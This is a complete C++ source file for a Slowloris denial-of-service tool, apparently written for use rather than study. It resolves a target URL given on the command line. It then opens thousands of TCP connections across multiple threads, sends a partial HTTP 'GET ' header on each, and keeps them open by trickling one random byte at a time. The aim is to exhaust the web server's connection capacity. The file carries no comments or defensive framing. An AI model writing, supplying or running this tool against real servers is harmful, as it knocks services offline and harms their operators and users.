#include <iostream>
#include <string>
#include <vector>
#include <algorithm>
#include <iterator>
#include <netdb.h>
#include <sys/socket.h>
#include <cstring>
#include <chrono>
#include <thread>
#include <unistd.h>

const int keep_alive = 1;
int threads = 12;
int connections = 2000;
std::string port = "80";
std::string url;
sockaddr_in socket_address;

class InputParser {
  public:
    InputParser(int argc, char* argv[]) { for (int i = 1; i < argc; ++i) this->tokens.push_back(std::string(argv[i])); }
    const std::string& get_arg(const std::string& option) {
    std::vector<std::string>::const_iterator itr;
    itr = std::find(this->tokens.begin(), this->tokens.end(), option);
    if (itr != this->tokens.end() && ++itr != this->tokens.end()) return *itr;
    return "";
  }
  bool arg_exists(const std::string& option) { return std::find(this->tokens.begin(), this->tokens.end(), option) != this->tokens.end(); }
  private:
    std::vector <std::string> tokens;
};

void slowloris () {
  std::vector<int> sockets;
  char header[] = "GET ";
  while (true) {
    int open = sockets.size();
    std::chrono::milliseconds timeout(rand() % 10000 + 1);
    if (open < connections) {
      for (;open < connections;) {
        int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (s >= 0) {
          setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &keep_alive, sizeof(keep_alive));
          connect(s, (sockaddr*)&socket_address, sizeof(sockaddr_in));
          send(s, header, sizeof(header) - 1, 0);
          sockets.push_back(s);
          open++;
        }
        else std::this_thread::sleep_for(timeout);
      }
    }
    for (int i = 0; i < open - 1;) {
      char next_value = 'a' + rand() % 26;
      int bytes_sent = send(sockets[i], &next_value, 1, 0);
      if (bytes_sent < 0) {
        close(sockets[i]); 
        sockets.erase(sockets.begin() + i);
      }
      else i++;
    }
    std::this_thread::sleep_for(timeout);
  }
}

void init(int argc, char* argv[]) {
  srand(time(NULL));
  InputParser input(argc, argv);
  if (input.arg_exists("-p")) port = input.get_arg("-p");
  if (input.arg_exists("-t")) threads = atoi(input.get_arg("-t").c_str());
  if (input.arg_exists("-c")) connections = atoi(input.get_arg("-c").c_str());
  if (input.arg_exists("-u")) url = input.get_arg("-u");
  if (!url.rfind("http://", 0)) url = url.substr(7);
  else if (!url.rfind("https://", 0)) url = url.substr(8);
}

void get_target_info() {
  hostent* host = gethostbyname(url.c_str());
  memcpy(&socket_address.sin_addr, host->h_addr, host->h_length);
  socket_address.sin_family = AF_INET;
  socket_address.sin_port = htons(strtoul(port.c_str(), NULL, 0));
}

int main (int argc, char* argv[]) {
  init(argc, argv);
  get_target_info();
  std::vector<std::thread> thread_vector;
  for (int i = 0; i < threads; i++) thread_vector.push_back(std::thread(slowloris));
  for (std::thread& thread : thread_vector) if (thread.joinable()) thread.join();
}
